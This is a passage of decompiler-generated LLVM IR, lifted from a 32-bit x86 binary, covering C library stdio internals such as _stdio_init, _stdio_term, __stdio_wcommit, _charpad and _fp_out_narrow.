  %v3_804e4d4 = inttoptr i32 %v2_804e4d4 to i32*
  store i32 %v1_804e4ca, i32* %v3_804e4d4, align 4
  br i1 %v1_804e4d2, label %dec_label_pc_804e4ed, label %dec_label_pc_804e4d9

dec_label_pc_804e4d9:                             ; preds = %dec_label_pc_804e4c2
  %v1_804e4d9 = add i32 %v1_804e4ca, 4096
  store i32 %v1_804e4d9, i32* %eax.global-to-local, align 4
  %v1_804e4de = load i32, i32* @ebp, align 4
  %v2_804e4de = add i32 %v1_804e4de, 12
  %v3_804e4de = inttoptr i32 %v2_804e4de to i32*
  store i32 %v1_804e4d9, i32* %v3_804e4de, align 4
  %v0_804e4e1 = load i32, i32* @ebp, align 4
  %v1_804e4e1 = inttoptr i32 %v0_804e4e1 to i32*
  %v2_804e4e1 = load i32, i32* %v1_804e4e1, align 4
  %v1_804e4e4 = udiv i32 %v2_804e4e1, 256
  %v3_804e4e4 = and i32 %v1_804e4e4, 191
  %v8_804e4e4 = or i32 %v3_804e4e4, 64
  %v10_804e4e4 = mul nuw nsw i32 %v8_804e4e4, 256
  %v11_804e4e4 = and i32 %v2_804e4e1, -65281
  %v12_804e4e4 = or i32 %v10_804e4e4, %v11_804e4e4
  store i32 %v12_804e4e4, i32* %eax.global-to-local, align 4
  %v1_804e4e7 = trunc i32 %v12_804e4e4 to i16
  %v3_804e4e7 = inttoptr i32 %v0_804e4e1 to i16*
  store i16 %v1_804e4e7, i16* %v3_804e4e7, align 2
  br label %dec_label_pc_804e4f4

dec_label_pc_804e4ed:                             ; preds = %dec_label_pc_804e4c2
  %v0_804e4ed = load i32, i32* @ebp, align 4
  %v1_804e4ed = add i32 %v0_804e4ed, 12
  %v2_804e4ed = inttoptr i32 %v1_804e4ed to i32*
  store i32 0, i32* %v2_804e4ed, align 4
  br label %dec_label_pc_804e4f4

dec_label_pc_804e4f4:                             ; preds = %dec_label_pc_804e46d, %dec_label_pc_804e4d9, %dec_label_pc_804e4ed
  %v0_804e4f4 = load i32, i32* @ebp, align 4
  %v1_804e4f4 = add i32 %v0_804e4f4, 8
  %v2_804e4f4 = inttoptr i32 %v1_804e4f4 to i32*
  %v3_804e4f4 = load i32, i32* %v2_804e4f4, align 4
  store i32 %v3_804e4f4, i32* %eax.global-to-local, align 4
  %v1_804e4f7 = add i32 %v0_804e4f4, 2
  %v2_804e4f7 = inttoptr i32 %v1_804e4f7 to i8*
  store i8 0, i8* %v2_804e4f7, align 1
  %v0_804e4fb = load i32, i32* @ebp, align 4
  %v1_804e4fb = add i32 %v0_804e4fb, 44
  %v2_804e4fb = inttoptr i32 %v1_804e4fb to i32*
  store i32 0, i32* %v2_804e4fb, align 4
  %v0_804e502 = load i32, i32* @ebp, align 4
  %v1_804e502 = add i32 %v0_804e502, 1
  %v2_804e502 = inttoptr i32 %v1_804e502 to i8*
  %v3_804e502 = load i8, i8* %v2_804e502, align 1
  %v4_804e502 = and i8 %v3_804e502, 32
  %v5_804e502 = icmp eq i8 %v4_804e502, 0
  %v0_804e506 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e506 = add i32 %v0_804e502, 24
  %v3_804e506 = inttoptr i32 %v2_804e506 to i32*
  store i32 %v0_804e506, i32* %v3_804e506, align 4
  %v0_804e509 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e509 = load i32, i32* @ebp, align 4
  %v2_804e509 = add i32 %v1_804e509, 28
  %v3_804e509 = inttoptr i32 %v2_804e509 to i32*
  store i32 %v0_804e509, i32* %v3_804e509, align 4
  %v0_804e50c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e50c = load i32, i32* @ebp, align 4
  %v2_804e50c = add i32 %v1_804e50c, 16
  %v3_804e50c = inttoptr i32 %v2_804e50c to i32*
  store i32 %v0_804e50c, i32* %v3_804e50c, align 4
  %v0_804e50f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e50f = load i32, i32* @ebp, align 4
  %v2_804e50f = add i32 %v1_804e50f, 20
  %v3_804e50f = inttoptr i32 %v2_804e50f to i32*
  store i32 %v0_804e50f, i32* %v3_804e50f, align 4
  %v0_804e512 = load i32, i32* @global_var_8059e2c.161, align 4
  store i32 %v0_804e512, i32* @eax, align 4
  %v1_804e517 = load i32, i32* @ebp, align 4
  %v2_804e517 = add i32 %v1_804e517, 52
  %v3_804e517 = inttoptr i32 %v2_804e517 to i32*
  store i32 %v0_804e512, i32* %v3_804e517, align 4
  br i1 %v5_804e502, label %dec_label_pc_804e589, label %dec_label_pc_804e51c

dec_label_pc_804e51c:                             ; preds = %dec_label_pc_804e4f4
  %v2_804e527 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e527, i32* %stack_var_-76, align 4
  %v2_804e52c = call i32 @__pthread_return_void(i32 %v2_804e527, i32 134552351)
  store i32 %v2_804e52c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059e14.158 to i32), i32* %stack_var_-76, align 4
  %v1_804e538 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059e14.158 to i32))
  store i32 %v1_804e538, i32* @eax, align 4
  %v2_804e54a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e54a, i32* %stack_var_-76, align 4
  %v2_804e54f = call i32 @__pthread_return_void(i32 %v2_804e54a, i32 134552351)
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059dfc.162 to i32), i32* %stack_var_-76, align 4
  %v1_804e55b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059dfc.162 to i32))
  %v0_804e560 = load i32, i32* bitcast (i32** @global_var_8059df8.163 to i32*), align 8
  store i32 %v0_804e560, i32* @eax, align 4
  %v1_804e565 = load i32, i32* @ebp, align 4
  %v2_804e565 = add i32 %v1_804e565, 32
  %v3_804e565 = inttoptr i32 %v2_804e565 to i32*
  store i32 %v0_804e560, i32* %v3_804e565, align 4
  %v2_804e568 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804e568, i32* @ecx, align 4
  %v0_804e569 = load i32, i32* @ebp, align 4
  store i32 %v0_804e569, i32* bitcast (i32** @global_var_8059df8.163 to i32*), align 8
  store i32 %v2_804e54a, i32* %stack_var_-76, align 4
  %v2_804e573 = call i32 @__pthread_return_void(i32 %v2_804e54a, i32 1)
  store i32 %v2_804e54a, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804e527, i32* %stack_var_-76, align 4
  %v2_804e57d = call i32 @__pthread_return_void(i32 %v2_804e527, i32 1)
  br label %dec_label_pc_804e582

dec_label_pc_804e582:                             ; preds = %dec_label_pc_804e39b, %dec_label_pc_804e51c
  %storemerge = phi i32 [ %v2_804e57d, %dec_label_pc_804e51c ], [ %v1_804e3a1, %dec_label_pc_804e39b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e589

dec_label_pc_804e587:                             ; preds = %dec_label_pc_804e391, %dec_label_pc_804e37e
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e589

dec_label_pc_804e589:                             ; preds = %dec_label_pc_804e4f4, %dec_label_pc_804e3ca, %dec_label_pc_804e582, %dec_label_pc_804e587
  %v0_804e58c = load i32, i32* @ebp, align 4
  store i32 %v0_804e58c, i32* %eax.global-to-local, align 4
  %v2_804e58e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e58e, i32* @ebx, align 4
  store i32 %v0_804e352, i32* @esi, align 4
  store i32 %v0_804e351, i32* @edi, align 4
  store i32 %v0_804e350, i32* @ebp, align 4
  ret i32 %v0_804e58c

; uselistorder directives
  uselistorder i32 %v2_804e54a, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804e527, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804e4e1, { 1, 0 }
  uselistorder i32 %v1_804e4ca, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e4b1, { 1, 0 }
  uselistorder i32 %v1_804e496, { 1, 0, 2 }
  uselistorder i32 %v11_804e44b, { 1, 0 }
  uselistorder i32 %v1_804e41d, { 1, 0 }
  uselistorder i32 %v0_804e419, { 1, 0 }
  uselistorder i32 %v2_804e44f, { 1, 0, 2 }
  uselistorder i32 %v1_804e3cf, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 27 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 3, 1, 0, 4, 2, 5 }
  uselistorder label %dec_label_pc_804e589, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e582, { 1, 0 }
  uselistorder label %dec_label_pc_804e4f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e43f, { 1, 0 }
  uselistorder label %dec_label_pc_804e3fc, { 1, 0 }
  uselistorder label %dec_label_pc_804e3c6, { 1, 0 }
  uselistorder label %dec_label_pc_804e3ad, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e595 = load i32, i32* @edi, align 4
  %v0_804e596 = load i32, i32* @esi, align 4
  %v0_804e597 = load i32, i32* @ebx, align 4
  store i32 %v0_804e597, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e5a0 = call i32 @__errno_location(i32 %v0_804e597)
  %v0_804e5a8 = load i16, i16* @global_var_8059e40.154, align 64
  %v1_804e5a8 = zext i16 %v0_804e5a8 to i32
  store i32 %v1_804e5a8, i32* @esi, align 4
  %v1_804e5af = inttoptr i32 %v1_804e5a0 to i32*
  %v2_804e5af = load i32, i32* %v1_804e5af, align 4
  store i32 %v2_804e5af, i32* %ebp.global-to-local, align 4
  store i32 %v1_804e5a0, i32* @edi, align 4
  %v1_804e5b5 = call i32 @isatty(i32 0)
  %v0_804e5ba = load i32, i32* @ebx, align 4
  %v2_804e5c3 = sub i32 %v0_804e5ba, %v1_804e5b5
  %v2_804e5c7 = mul i32 %v2_804e5c3, 256
  %v0_804e5ca = load i32, i32* @esi, align 4
  %v2_804e5ca = xor i32 %v0_804e5ca, %v2_804e5c7
  %v1_804e5cc = trunc i32 %v2_804e5ca to i16
  store i16 %v1_804e5cc, i16* @global_var_8059e40.154, align 64
  %v0_804e5d3 = load i16, i16* @global_var_8059e90.155, align 16
  %v1_804e5d3 = zext i16 %v0_804e5d3 to i32
  store i32 %v1_804e5d3, i32* @esi, align 4
  %v1_804e5da = call i32 @isatty(i32 1)
  %v0_804e5df = load i32, i32* @ebx, align 4
  %v2_804e5df = sub i32 %v0_804e5df, %v1_804e5da
  %v2_804e5e1 = mul i32 %v2_804e5df, 256
  %v0_804e5e4 = load i32, i32* @esi, align 4
  %v2_804e5e4 = xor i32 %v2_804e5e1, %v0_804e5e4
  %v1_804e5e6 = trunc i32 %v2_804e5e4 to i16
  store i16 %v1_804e5e6, i16* @global_var_8059e90.155, align 16
  %v0_804e5ed = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e5ed = load i32, i32* @edi, align 4
  %v2_804e5ed = inttoptr i32 %v1_804e5ed to i32*
  store i32 %v0_804e5ed, i32* %v2_804e5ed, align 4
  %v2_804e5f2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e5f2, i32* @ebx, align 4
  store i32 %v0_804e596, i32* @esi, align 4
  store i32 %v0_804e595, i32* @edi, align 4
  ret i32 %v1_804e5da

; uselistorder directives
  uselistorder i32 %v1_804e5a0, { 1, 0 }
  uselistorder i16* @global_var_8059e90.155, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e605 = inttoptr i32 %arg1 to i16*
  %v4_804e605 = call i32 @memcpy(i16* %v3_804e605, i32 ptrtoint (i32* @global_var_8057360.164 to i32), i32 24)
  ret i32 %v4_804e605
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e60e = load i32, i32* @esi, align 4
  %v0_804e60f = load i32, i32* @ebx, align 4
  store i32 %v0_804e60f, i32* %stack_var_-8, align 4
  %v1_804e618 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8059dfc.162 to i32))
  store i32 %v1_804e618, i32* %eax.global-to-local, align 4
  %v1_804e624 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8059e14.158 to i32))
  store i32 %v1_804e624, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_8059df8.163 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e66e22 = icmp eq i32 %storemerge21, 0
  %v1_804e67024 = icmp eq i1 %v1_804e66e22, false
  br i1 %v1_804e67024, label %dec_label_pc_804e631.lr.ph, label %dec_label_pc_804e68e.preheader

dec_label_pc_804e631.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e631

dec_label_pc_804e631:                             ; preds = %dec_label_pc_804e631.lr.ph, %dec_label_pc_804e658
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804e631.lr.ph ], [ %storemerge, %dec_label_pc_804e658 ]
  %v1_804e634 = add i32 %storemerge25, 56
  store i32 %v1_804e634, i32* @esi, align 4
  %v1_804e638 = call i32 @__pthread_return_0(i32 %v1_804e634)
  store i32 %v1_804e638, i32* %eax.global-to-local, align 4
  %v1_804e640 = icmp eq i32 %v1_804e638, 0
  br i1 %v1_804e640, label %dec_label_pc_804e658, label %dec_label_pc_804e644

dec_label_pc_804e644:                             ; preds = %dec_label_pc_804e631
  %v0_804e644 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e644 = add i32 %v0_804e644, 8
  %v2_804e644 = inttoptr i32 %v1_804e644 to i32*
  %v3_804e644 = load i32, i32* %v2_804e644, align 4
  store i32 %v3_804e644, i32* %eax.global-to-local, align 4
  %v1_804e647 = inttoptr i32 %v0_804e644 to i16*
  store i16 48, i16* %v1_804e647, align 2
  %v0_804e64c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e64c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e64c = add i32 %v1_804e64c, 24
  %v3_804e64c = inttoptr i32 %v2_804e64c to i32*
  store i32 %v0_804e64c, i32* %v3_804e64c, align 4
  %v0_804e64f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e64f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e64f = add i32 %v1_804e64f, 28
  %v3_804e64f = inttoptr i32 %v2_804e64f to i32*
  store i32 %v0_804e64f, i32* %v3_804e64f, align 4
  %v0_804e652 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e652 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e652 = add i32 %v1_804e652, 16
  %v3_804e652 = inttoptr i32 %v2_804e652 to i32*
  store i32 %v0_804e652, i32* %v3_804e652, align 4
  %v0_804e655 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e655 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e655 = add i32 %v1_804e655, 20
  %v3_804e655 = inttoptr i32 %v2_804e655 to i32*
  store i32 %v0_804e655, i32* %v3_804e655, align 4
  br label %dec_label_pc_804e658

dec_label_pc_804e658:                             ; preds = %dec_label_pc_804e631, %dec_label_pc_804e644
  %v0_804e65b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e65b = add i32 %v0_804e65b, 52
  %v2_804e65b = inttoptr i32 %v1_804e65b to i32*
  store i32 1, i32* %v2_804e65b, align 4
  %v0_804e662 = load i32, i32* @esi, align 4
  %v1_804e663 = call i32 @__stdio_init_mutex(i32 %v0_804e662)
  store i32 %v1_804e663, i32* %eax.global-to-local, align 4
  %v0_804e668 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e668 = add i32 %v0_804e668, 32
  %v2_804e668 = inttoptr i32 %v1_804e668 to i32*
  %storemerge = load i32, i32* %v2_804e668, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e66e = icmp eq i32 %storemerge, 0
  %v1_804e670 = icmp eq i1 %v1_804e66e, false
  br i1 %v1_804e670, label %dec_label_pc_804e631, label %dec_label_pc_804e66b.dec_label_pc_804e68e.preheader_crit_edge

dec_label_pc_804e66b.dec_label_pc_804e68e.preheader_crit_edge: ; preds = %dec_label_pc_804e658
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8059df8.163 to i32*), align 4
  br label %dec_label_pc_804e68e.preheader

dec_label_pc_804e68e.preheader:                   ; preds = %dec_label_pc_804e66b.dec_label_pc_804e68e.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e66b.dec_label_pc_804e68e.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e68e3 = icmp eq i32 %storemerge12, 0
  %v1_804e69010 = icmp eq i1 %v1_804e68e3, false
  br i1 %v1_804e69010, label %dec_label_pc_804e67a.preheader, label %dec_label_pc_804e692

dec_label_pc_804e67a.preheader:                   ; preds = %dec_label_pc_804e68e.preheader
  br label %dec_label_pc_804e67a

dec_label_pc_804e67a:                             ; preds = %dec_label_pc_804e67a.preheader, %dec_label_pc_804e68b
  %v0_804e682 = phi i32 [ %storemerge1, %dec_label_pc_804e68b ], [ %storemerge12, %dec_label_pc_804e67a.preheader ]
  %v1_804e67a = inttoptr i32 %v0_804e682 to i8*
  %v2_804e67a = load i8, i8* %v1_804e67a, align 1
  %v3_804e67a = and i8 %v2_804e67a, 64
  %v4_804e67a = icmp eq i8 %v3_804e67a, 0
  br i1 %v4_804e67a, label %dec_label_pc_804e68b, label %dec_label_pc_804e67f

dec_label_pc_804e67f:                             ; preds = %dec_label_pc_804e67a
  %v1_804e683 = call i32 @__stdio_wcommit(i32 %v0_804e682)
  store i32 %v1_804e683, i32* %eax.global-to-local, align 4
  %v0_804e68b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e68b

dec_label_pc_804e68b:                             ; preds = %dec_label_pc_804e67a, %dec_label_pc_804e67f
  %v0_804e68b = phi i32 [ %v0_804e682, %dec_label_pc_804e67a ], [ %v0_804e68b.pre, %dec_label_pc_804e67f ]
  %v1_804e68b = add i32 %v0_804e68b, 32
  %v2_804e68b = inttoptr i32 %v1_804e68b to i32*
  %storemerge1 = load i32, i32* %v2_804e68b, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e68e = icmp eq i32 %storemerge1, 0
  %v1_804e690 = icmp eq i1 %v1_804e68e, false
  br i1 %v1_804e690, label %dec_label_pc_804e67a, label %dec_label_pc_804e692

dec_label_pc_804e692:                             ; preds = %dec_label_pc_804e68b, %dec_label_pc_804e68e.preheader
  %v2_804e692 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e692, i32* %eax.global-to-local, align 4
  %v2_804e693 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e693, i32* @ebx, align 4
  store i32 %v0_804e60e, i32* @esi, align 4
  ret i32 %v2_804e692

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804e68b, { 1, 0 }
  uselistorder label %dec_label_pc_804e67a, { 1, 0 }
  uselistorder label %dec_label_pc_804e658, { 1, 0 }
  uselistorder label %dec_label_pc_804e631, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e698 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e6a0 = add i32 %arg1, 8
  %v2_804e6a0 = inttoptr i32 %v1_804e6a0 to i32*
  %v3_804e6a0 = load i32, i32* %v2_804e6a0, align 4
  store i32 %v3_804e6a0, i32* %edx.global-to-local, align 4
  %v1_804e6a3 = add i32 %arg1, 16
  %v2_804e6a3 = inttoptr i32 %v1_804e6a3 to i32*
  %v3_804e6a3 = load i32, i32* %v2_804e6a3, align 4
  %v2_804e6a6 = sub i32 %v3_804e6a3, %v3_804e6a0
  %v12_804e6a6 = icmp eq i32 %v2_804e6a6, 0
  store i32 %v2_804e6a6, i32* %eax.global-to-local, align 4
  br i1 %v12_804e6a6, label %dec_label_pc_804e6b9, label %dec_label_pc_804e6aa

dec_label_pc_804e6aa:                             ; preds = %entry
  store i32 %v3_804e6a0, i32* %v2_804e6a3, align 4
  %v0_804e6ad = load i32, i32* @ecx, align 4
  %v0_804e6ae = load i32, i32* %eax.global-to-local, align 4
  %v0_804e6af = load i32, i32* %edx.global-to-local, align 4
  %v0_804e6b0 = load i32, i32* @ebx, align 4
  %v4_804e6b1 = inttoptr i32 %v0_804e6b0 to i16*
  %v5_804e6b1 = call i32 @__stdio_WRITE(i16* %v4_804e6b1, i32 %v0_804e6af, i32 %v0_804e6ae, i32 %v0_804e6ad)
  store i32 %v5_804e6b1, i32* %eax.global-to-local, align 4
  %v0_804e6b9.pre = load i32, i32* @ebx, align 4
  %v2_804e6bf.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e6b9

dec_label_pc_804e6b9:                             ; preds = %entry, %dec_label_pc_804e6aa
  %v2_804e6bf = phi i32 [ %tmp11, %entry ], [ %v2_804e6bf.pre, %dec_label_pc_804e6aa ]
  %v0_804e6b9 = phi i32 [ %arg1, %entry ], [ %v0_804e6b9.pre, %dec_label_pc_804e6aa ]
  %v1_804e6b9 = add i32 %v0_804e6b9, 16
  %v2_804e6b9 = inttoptr i32 %v1_804e6b9 to i32*
  %v3_804e6b9 = load i32, i32* %v2_804e6b9, align 4
  store i32 %v3_804e6b9, i32* %eax.global-to-local, align 4
  %v2_804e6bc = add i32 %v0_804e6b9, 8
  %v3_804e6bc = inttoptr i32 %v2_804e6bc to i32*
  %v4_804e6bc = load i32, i32* %v3_804e6bc, align 4
  %v5_804e6bc = sub i32 %v3_804e6b9, %v4_804e6bc
  store i32 %v5_804e6bc, i32* %eax.global-to-local, align 4
  store i32 %v2_804e6bf, i32* @edx, align 4
  store i32 %v0_804e698, i32* @ebx, align 4
  ret i32 %v5_804e6bc

; uselistorder directives
  uselistorder i32 %v0_804e6b9, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e6b9, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e6c4 = load i32, i32* @edi, align 4
  %v0_804e6c5 = load i32, i32* @eax, align 4
  store i32 %v0_804e6c5, i32* @edi, align 4
  %v0_804e6c7 = load i32, i32* @esi, align 4
  %v0_804e6c8 = load i32, i32* @ecx, align 4
  store i32 %v0_804e6c8, i32* @esi, align 4
  %v0_804e6ca = load i32, i32* @ebx, align 4
  store i32 %v0_804e6c8, i32* @ebx, align 4
  %v0_804e6d0 = load i32, i32* @edx, align 4
  store i32 %v0_804e6d0, i32* %stack_var_-13, align 4
  %v1_804e6d72 = icmp eq i32 %v0_804e6c8, 0
  br i1 %v1_804e6d72, label %dec_label_pc_804e6ef, label %dec_label_pc_804e6db.lr.ph

dec_label_pc_804e6db.lr.ph:                       ; preds = %entry
  %v2_804e6db = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e6db

dec_label_pc_804e6d6:                             ; preds = %dec_label_pc_804e6db
  %v1_804e6d6 = add i32 %v0_804e6d6, -1
  %v8_804e6d6 = icmp eq i32 %v1_804e6d6, 0
  store i32 %v1_804e6d6, i32* @ebx, align 4
  br i1 %v8_804e6d6, label %dec_label_pc_804e6ef.loopexit, label %dec_label_pc_804e6d6.dec_label_pc_804e6db_crit_edge

dec_label_pc_804e6d6.dec_label_pc_804e6db_crit_edge: ; preds = %dec_label_pc_804e6d6
  %v0_804e6df.pre = load i32, i32* @edx, align 4
  %v0_804e6e0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e6db

dec_label_pc_804e6db:                             ; preds = %dec_label_pc_804e6d6.dec_label_pc_804e6db_crit_edge, %dec_label_pc_804e6db.lr.ph
  %v0_804e6e0 = phi i32 [ %v0_804e6e0.pre, %dec_label_pc_804e6d6.dec_label_pc_804e6db_crit_edge ], [ %v0_804e6c5, %dec_label_pc_804e6db.lr.ph ]
  %v0_804e6df = phi i32 [ %v0_804e6df.pre, %dec_label_pc_804e6d6.dec_label_pc_804e6db_crit_edge ], [ %v0_804e6d0, %dec_label_pc_804e6db.lr.ph ]
  %v4_804e6e4 = call i32 @__stdio_fwrite(i32 %v2_804e6db, i32 1, i32 %v0_804e6e0, i32 %v0_804e6df)
  %v8_804e6ec = icmp eq i32 %v4_804e6e4, 1
  %v0_804e6d6 = load i32, i32* @ebx, align 4
  br i1 %v8_804e6ec, label %dec_label_pc_804e6d6, label %dec_label_pc_804e6ef.loopexit

dec_label_pc_804e6ef.loopexit:                    ; preds = %dec_label_pc_804e6d6, %dec_label_pc_804e6db
  %v1_804e6f2.ph = phi i32 [ %v0_804e6d6, %dec_label_pc_804e6db ], [ 0, %dec_label_pc_804e6d6 ]
  %v0_804e6f2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e6ef

dec_label_pc_804e6ef:                             ; preds = %dec_label_pc_804e6ef.loopexit, %entry
  %v0_804e6f2 = phi i32 [ 0, %entry ], [ %v0_804e6f2.pre, %dec_label_pc_804e6ef.loopexit ]
  %v1_804e6f2 = phi i32 [ 0, %entry ], [ %v1_804e6f2.ph, %dec_label_pc_804e6ef.loopexit ]
  %v2_804e6f2 = sub i32 %v0_804e6f2, %v1_804e6f2
  store i32 %v0_804e6ca, i32* @ebx, align 4
  store i32 %v0_804e6c7, i32* @esi, align 4
  store i32 %v0_804e6c4, i32* @edi, align 4
  ret i32 %v2_804e6f2

; uselistorder directives
  uselistorder i32 %v1_804e6d6, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e6ef.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e70d = trunc i32 %arg2 to i8
  %v5_804e70d = icmp slt i8 %v3_804e70d, 0
  %v1_804e70f = icmp eq i1 %v5_804e70d, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e70f, label %dec_label_pc_804e740, label %dec_label_pc_804e711

dec_label_pc_804e711:                             ; preds = %entry
  %v3_804e718 = call i32 @strlen(i8* %arg4)
  %v0_804e720 = load i32, i32* @ebx, align 4
  %v2_804e720 = sub i32 %v0_804e720, %v3_804e718
  store i32 %v2_804e720, i32* @ebx, align 4
  store i32 %v3_804e718, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e720, 1
  br i1 %tmp23, label %dec_label_pc_804e73e, label %dec_label_pc_804e728

dec_label_pc_804e728:                             ; preds = %dec_label_pc_804e711
  store i32 %arg1, i32* @eax, align 4
  %v0_804e72c = load i32, i32* @edi, align 4
  %v1_804e72c = urem i32 %v0_804e72c, 128
  store i32 %v1_804e72c, i32* @edi, align 4
  store i32 %v2_804e720, i32* @ecx, align 4
  store i32 %v1_804e72c, i32* @edx, align 4
  %v0_804e733 = call i32 @_charpad()
  %v12_804e738 = icmp eq i32 %v0_804e733, %v2_804e720
  store i32 %v0_804e733, i32* @ebp, align 4
  %v1_804e73c = icmp eq i1 %v12_804e738, false
  br i1 %v1_804e73c, label %dec_label_pc_804e75a, label %dec_label_pc_804e728.dec_label_pc_804e73e_crit_edge

dec_label_pc_804e728.dec_label_pc_804e73e_crit_edge: ; preds = %dec_label_pc_804e728
  %v0_804e73e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e73e

dec_label_pc_804e73e:                             ; preds = %dec_label_pc_804e728.dec_label_pc_804e73e_crit_edge, %dec_label_pc_804e711
  %v0_804e73e = phi i32 [ %v0_804e73e.pre, %dec_label_pc_804e728.dec_label_pc_804e73e_crit_edge ], [ %v3_804e718, %dec_label_pc_804e711 ]
  store i32 %v0_804e73e, i32* @ebx, align 4
  br label %dec_label_pc_804e740

dec_label_pc_804e740:                             ; preds = %entry, %dec_label_pc_804e73e
  %v0_804e74b = phi i32 [ %arg3, %entry ], [ %v0_804e73e, %dec_label_pc_804e73e ]
  %tmp24 = icmp slt i32 %v0_804e74b, 1
  br i1 %tmp24, label %dec_label_pc_804e758, label %dec_label_pc_804e746

dec_label_pc_804e746:                             ; preds = %dec_label_pc_804e740
  %v0_804e746 = load i32, i32* @ecx, align 4
